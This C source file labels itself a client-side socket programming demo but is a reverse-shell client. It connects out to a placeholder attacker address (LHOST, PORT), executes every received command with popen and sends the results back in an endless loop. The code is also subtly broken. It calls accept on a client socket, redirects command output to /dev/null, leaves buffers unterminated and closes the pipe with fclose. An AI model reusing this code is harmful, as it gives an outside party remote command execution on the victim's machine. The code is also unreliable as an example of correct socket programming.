// Client side C/C++ program to demonstrate Socket
// programming
#include <stdio.h>
#include <sys/socket.h> 
#include <stdlib.h>
#include <netinet/in.h> 
#include <string.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <unistd.h>

char message[10000];
struct sockaddr_in serv; 
int fd; 
int conn; 
int valread;
char output;
char shell[10000];
char redirect[100] = " >/dev/null 2>&1";

int main(){
  char ip[] = LHOST;
  int port = PORT;

  fd = socket(AF_INET, SOCK_STREAM, 0);

  serv.sin_family = AF_INET;
  serv.sin_port = htons(port);

  inet_pton(AF_INET, ip, &serv.sin_addr); //Binds client to localhost

  connect(fd, (struct sockaddr *)&serv, sizeof(serv)); //connects client to server
  
  conn = accept(fd, (struct sockaddr *)NULL, NULL);
 
  while(1){
    fflush(stdout);

    valread = read(fd, message, 10000);
        
    if(valread > 0){
      strcat(message, redirect);
      message[strlen(message)] = ' ';

      FILE *file = popen(message, "r");
      output = fgetc(file);
      int i = 0;
      
      while (output != EOF){
        
        shell[i] = output;

        output = fgetc(file);
        i++;
      }
       
      send(fd, shell, strlen(shell), 0);
      for(int i = 0; i < strlen(shell); i++){
        shell[i] = ' ';
      }
      fclose(file);
    
    }  
  
}

  return 0;
}
